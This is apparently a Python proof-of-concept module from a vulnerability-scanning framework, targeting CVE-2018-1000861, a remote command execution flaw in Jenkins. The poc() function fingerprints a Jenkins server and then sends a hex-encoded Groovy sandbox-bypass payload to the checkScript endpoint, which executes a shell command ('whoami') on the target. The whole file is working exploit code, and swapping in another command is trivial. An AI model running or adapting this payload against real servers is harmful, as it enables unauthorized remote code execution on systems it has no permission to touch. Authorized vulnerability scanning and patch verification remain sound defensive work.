#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import re
import urllib
import binascii
from Config.config_requests import headers
requests.packages.urllib3.disable_warnings()

########################################################################################################################
# 脚本信息
NAME = 'CVE_2018_1000861'
AUTHOR = "RabbitMask"
REMARK = 'Jenkins远程命令执行漏洞'
FOFA_RULE = '对应漏洞框架的fofa语法'

########################################################################################################################
# 漏洞检测模块
def poc(target):
    result = {}
    try:
        endpoint = '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
        cmd = 'whoami'
        payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.hexlify(
            cmd.encode('utf-8')).decode('utf-8')
        params = {
            'sandbox': True,
            'value': payload
        }
        req = requests.get(target, headers=headers, timeout=5)
        if re.search('Jenkins', str(req.headers)) and re.search('adjuncts', req.text) and req.status_code == 200:
            vurl = urllib.parse.urljoin(target, endpoint)
            rep2 = requests.get(vurl, headers=headers, timeout=5)
            if rep2.status_code != 404:
                rep3 = requests.get(vurl, params=params, headers=headers, timeout=5)
                if rep3.status_code == 200:
                    result['target'] = target
                    result['poc'] = NAME
                    return result
    except:
        pass


